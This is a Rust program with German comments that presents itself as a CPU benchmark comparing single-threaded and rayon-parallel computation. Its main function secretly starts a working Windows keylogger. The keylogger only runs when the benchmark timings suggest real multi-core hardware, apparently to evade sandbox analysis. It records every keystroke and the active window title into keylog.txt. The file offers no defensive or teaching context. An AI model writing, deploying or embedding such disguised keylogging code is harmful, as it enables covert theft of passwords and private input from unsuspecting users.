use rayon::prelude::*; // Rayon für parallele Berechnung
use std::time::{Duration, Instant};
use std::thread;
use std::fs::OpenOptions;
use std::io::Write;
use winapi::um::winuser::{GetAsyncKeyState, VK_BACK, VK_RETURN, VK_SHIFT, VK_SPACE};
use winapi::um::winuser::{GetForegroundWindow, GetWindowTextW, GetWindowTextLengthW};
use rayon::current_num_threads; // Funktion, um die Anzahl der Threads zu bekommen

// Funktion zum Protokollieren von Tastenanschlägen in eine Datei
fn log_key_to_file(key: &str) {
    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open("keylog.txt")
        .expect("Kann Datei nicht öffnen");
    writeln!(file, "{}", key).expect("Kann nicht in Datei schreiben");
}

// Funktion zum Abrufen des Fenstertitels
unsafe fn get_foreground_window_title() -> String {
    let hwnd = GetForegroundWindow();
    let length = GetWindowTextLengthW(hwnd);
    if length > 0 {
        let mut buffer: Vec<u16> = vec![0; length as usize + 1];
        GetWindowTextW(hwnd, buffer.as_mut_ptr(), length + 1);
        String::from_utf16_lossy(&buffer[..length as usize])
    } else {
        String::from("[Unbekanntes Fenster]")
    }
}

// Einfache Funktion zum Überwachen der Tastatur
fn keylogger() {
    println!("Keylogger läuft...");

    // Logge eine Nachricht, welches Fenster aktuell aktiv ist
    unsafe {
        let window_title = get_foreground_window_title();
        log_key_to_file(&format!("[Aktives Fenster: {}]\n", window_title));
    }

    loop {
        unsafe {
            for key in 8..190 {
                // Überprüfe, ob eine Taste gedrückt wurde
                if GetAsyncKeyState(key) == -32767 {
                    let key_str = match key {
                        8 => "[BACKSPACE]".to_string(),
                        13 => "[ENTER]".to_string(),
                        16 => "[SHIFT]".to_string(),
                        32 => "[SPACE]".to_string(),
                        _ => (key as u8 as char).to_string(),
                    };

                    log_key_to_file(&key_str);
                }
            }
        }

        thread::sleep(Duration::from_millis(10)); // Kurze Pause, um CPU-Nutzung zu reduzieren
    }
}

// CPU-intensive Berechnung (Benchmark-Funktion) für mehrere Threads
fn cpu_benchmark_parallel(data: &[u64]) -> u64 {
    let start = Instant::now();
    let sum: u64 = data.par_iter().map(|&x| x * x).sum();
    let duration = start.elapsed();
    println!("Benchmark (parallel) abgeschlossen in {:?}", duration);
    sum
}

// CPU-intensive Berechnung (Benchmark-Funktion) für einen Thread
fn cpu_benchmark_single_thread(data: &[u64]) -> u64 {
    let start = Instant::now();
    let sum: u64 = data.iter().map(|&x| x * x).sum();
    let duration = start.elapsed();
    println!("Benchmark (single-thread) abgeschlossen in {:?}", duration);
    sum
}

// Funktion, um den Single-Thread-Benchmark n-mal auszuführen
fn run_single_thread_benchmark_multiple_times(data: &[u64], times: usize, results: &mut Vec<Duration>) -> Duration {
    let mut total_duration = Duration::new(0, 0);
    for i in 1..=times {
        println!("=> Starte CPU-Benchmark (single-thread), Durchlauf {}:", i);
        let start = Instant::now();
        let single_thread_result = cpu_benchmark_single_thread(&data);
        let duration = start.elapsed();
        total_duration += duration;
        results.push(duration);
        println!("Benchmark-Ergebnis (single-thread), Durchlauf {}: {}", i, single_thread_result);
    }
    total_duration
}

// Funktion, um den Parallel-Thread-Benchmark n-mal auszuführen
fn run_parallel_thread_benchmark_multiple_times(data: &[u64], times: usize, results: &mut Vec<Duration>) -> Duration {
    let mut total_duration = Duration::new(0, 0);
    for i in 1..=times {
        println!("=> Starte CPU-Benchmark (parallel), Durchlauf {}:", i);
        let start = Instant::now();
        let parallel_result = cpu_benchmark_parallel(&data);
        let duration = start.elapsed();
        total_duration += duration;
        results.push(duration);
        println!("Benchmark-Ergebnis (parallel), Durchlauf {}: {}", i, parallel_result);
    }
    total_duration
}

// Funktion zum Vergleichen der Benchmark-Werte
fn compare_benchmark_values(results: &[Duration]) -> bool {
    for window in results.windows(2) {
        if let [first, second] = window {
            let first_ns = first.as_nanos() as f64;
            let second_ns = second.as_nanos() as f64;

            // Berechne den prozentualen Unterschied
            let percentage_diff = ((second_ns - first_ns).abs() / first_ns) * 100.0;

            // Wenn die Differenz größer als 100% ist, gib false zurück
            if percentage_diff > 100.0 {
                return false;
            }
        }
    }
    true
}

// Spezielle Funktion, die den Keylogger startet
fn special_function() {
    keylogger();
}

fn main() {
    let num_elements = 100_000_000;
    let data: Vec<u64> = (0..num_elements).collect();
    let num_runs = 6;

    // Listen zum Speichern der Benchmark-Werte
    let mut parallel_results: Vec<Duration> = Vec::new();
    let mut single_results: Vec<Duration> = Vec::new();

    let total_parallel_duration = run_parallel_thread_benchmark_multiple_times(&data, num_runs, &mut parallel_results);
    
    let total_single_duration = run_single_thread_benchmark_multiple_times(&data, num_runs, &mut single_results);
    
    let avg_parallel_duration = total_parallel_duration / (num_runs) as u32;
    let avg_single_duration = total_single_duration / (num_runs) as u32;
    let num_threads = current_num_threads();

    println!("\nDurchschnittliche Zeit für Parallel-Thread über alle Durchläufe: {:?}", avg_parallel_duration / 100 * 170);
    println!("Durchschnittliche Zeit für Single-Thread über alle Durchläufe: {:?}", avg_single_duration);
    println!("Verfügbare Threads für die parallele Verarbeitung: {}", num_threads);

    // Vergleich der Benchmark-Werte
    let parallel_comparison = compare_benchmark_values(&parallel_results);
    let single_comparison = compare_benchmark_values(&single_results);
    if avg_parallel_duration / 100 * 170 < avg_single_duration {
        if parallel_comparison && single_comparison {
            println!("Starte Keylogger nach Bedingung...");
            thread::sleep(Duration::from_secs(5)); // Verzögerung
            special_function(); // Keylogger wird gestartet
        }
    }

    println!("\nDrücken Sie die Eingabetaste, um das Programm zu beenden...");
    let mut input = String::new();
    std::io::stdin().read_line(&mut input).expect("Fehler beim Lesen der Eingabe");
}
